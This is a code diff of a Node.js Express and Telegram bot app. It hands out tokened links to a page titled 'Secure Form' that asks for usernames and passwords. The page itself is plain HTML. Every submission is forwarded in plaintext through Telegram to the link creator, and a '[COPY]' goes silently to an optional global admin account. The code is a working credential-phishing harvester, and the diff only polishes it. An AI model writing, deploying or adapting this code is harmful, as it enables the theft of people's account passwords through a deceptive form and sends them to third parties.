@@ -7,25 +7,22 @@ const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Environment variables (set these in Vercel / GitHub Actions / .env for local)
+// Environment variables (set in Vercel → Settings → Environment Variables)
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const ADMIN_ID = process.env.ADMIN_ID || null; // optional global admin
 const BASE_URL = process.env.BASE_URL || null; // example: https://myproject.vercel.app
+const ADMIN_ID = process.env.ADMIN_ID || null; // optional, can be skipped
 
 if (!BOT_TOKEN) {
-  console.error("ERROR: BOT_TOKEN environment variable required");
-  // On serverless, just export and let deploy show error; we don't exit process
+  console.error("❌ ERROR: BOT_TOKEN environment variable required");
 }
 
 const bot = new Telegraf(BOT_TOKEN);
 
-// In-memory storage for tokens. (For production use a DB)
+// In-memory storage for tokens (simple, not persistent)
 const tokens = new Map(); // token -> { creatorId, expiresAt }
+const TOKEN_LIFETIME = 24 * 60 * 60 * 1000; // 24 hours
 
-// Token lifetime (ms). Default 24 hours
-const TOKEN_LIFETIME = 24 * 60 * 60 * 1000;
-
-function genToken(len = 6) {
+function genToken(len = 8) {
   return crypto.randomBytes(Math.ceil(len/2)).toString('hex').slice(0, len);
 }
 
@@ -42,54 +39,40 @@ function cleanupExpiredTokens() {
     if (info.expiresAt <= now) tokens.delete(t);
   }
 }
-
-// Periodic cleanup (works only while instance is alive)
 setInterval(cleanupExpiredTokens, 60 * 60 * 1000);
 
-// Telegram command to create link: /create
+// ✅ Start command
+bot.start((ctx) => {
+  ctx.reply("👋 Welcome! Use /create to generate a unique form link.");
+});
+
+// ✅ Create command
 bot.command('create', async (ctx) => {
-  try {
-    const creatorId = ctx.from && ctx.from.id;
-    const token = createTokenForUser(creatorId);
+  const creatorId = ctx.from?.id;
+  const token = createTokenForUser(creatorId);
 
-    if (!BASE_URL) {
-      await ctx.reply("ERROR: BASE_URL environment variable not set on server. Set BASE_URL to your deployed URL.");
-      return;
-    }
-
-    const link = `${BASE_URL.replace(/\/+$/,'')}/form/${token}`;
-
-    await ctx.reply(`✅ Unique link created:\n${link}\n\nयह link 24 घंटे तक वैध रहेगा।`);
-  } catch (err) {
-    console.error("create command error:", err);
-    await ctx.reply("कम्पने में त्रुटि हुई।");
+  if (!BASE_URL) {
+    await ctx.reply("❌ BASE_URL environment variable not set!");
+    return;
   }
+
+  const link = `${BASE_URL.replace(/\/+$/, '')}/form/${token}`;
+  await ctx.reply(`✅ Unique link created:\n${link}\n\nThis link is valid for 24 hours.`);
 });
 
-// Simple helpers to validate token
-function validateToken(token) {
-  cleanupExpiredTokens();
-  if (!token) return null;
-  const info = tokens.get(token);
-  if (!info) return null;
-  return info;
-}
-
-// --- Express routes ---
-// root — health check
+// 🚀 Routes
 app.get('/', (req, res) => {
-  res.send('Telegram Form Bot running');
+  res.send('✅ Telegram Form Bot is running');
 });
 
-// Serve form for token
 app.get('/form/:token', (req, res) => {
   const token = req.params.token;
-  const info = validateToken(token);
-  if (!info) {
-    return res.status(404).send('<h3>Invalid or expired link</h3>');
+  const info = tokens.get(token);
+
+  if (!info || info.expiresAt < Date.now()) {
+    return res.status(404).send('<h3>❌ Invalid or expired link</h3>');
   }
 
-  // Simple HTML form
   res.send(`
     <html>
       <head><meta charset="utf-8"/><title>Secure Form</title></head>
@@ -100,47 +83,40 @@ app.get('/form/:token', (req, res) => {
           <input type="password" name="password" placeholder="Password" required /><br/><br/>
           <button type="submit">Submit</button>
         </form>
-        <p>Link valid until: ${new Date(info.expiresAt).toLocaleString()}</p>
+        <p>⏳ Link valid until: ${new Date(info.expiresAt).toLocaleString()}</p>
       </body>
     </html>
   `);
 });
 
-// Handle submission
 app.post('/submit/:token', async (req, res) => {
   const token = req.params.token;
-  const info = validateToken(token);
-  if (!info) {
-    return res.status(404).send('Invalid or expired link');
+  const info = tokens.get(token);
+
+  if (!info || info.expiresAt < Date.now()) {
+    return res.status(404).send('❌ Invalid or expired link');
   }
 
   const { username, password } = req.body;
   if (!username || !password) {
-    return res.status(400).send('Missing fields');
+    return res.status(400).send('❌ Missing fields');
   }
 
-  const message = `📩 New submission from link ${token}\n👤 Username: ${username}\n🔑 Password: ${password}\n🔒 Sent to: ${info.creatorId}`;
+  const message = `📩 New submission from link ${token}\n👤 Username: ${username}\n🔑 Password: ${password}`;
 
   try {
-    // Send to the creator of the link
     await bot.telegram.sendMessage(info.creatorId, message);
-
-    // Optional: send to global ADMIN too (if set)
     if (ADMIN_ID) {
-      await bot.telegram.sendMessage(ADMIN_ID, `[COPY] ${message}`);
+      await bot.telegram.sendMessage(ADMIN_ID, `[COPY]\n${message}`);
     }
-
-    // If you want link to be single-use, uncomment:
-    // tokens.delete(token);
-
-    res.send('<h3>Thanks — your data has been submitted.</h3>');
+    res.send('<h3>✅ Thanks — your data has been submitted.</h3>');
   } catch (err) {
-    console.error('Error sending to Telegram:', err);
-    res.status(500).send('Server error');
+    console.error("Telegram send error:", err);
+    res.status(500).send('❌ Server error');
   }
 });
 
-// Telegram webhook endpoint — Telegram should POST updates here
+// Telegram webhook
 app.post('/api/bot', async (req, res) => {
   try {
     await bot.handleUpdate(req.body, res);
@@ -150,5 +126,4 @@ app.post('/api/bot', async (req, res) => {
   }
 });
 
-// Export app so Vercel can use it
 module.exports = app;
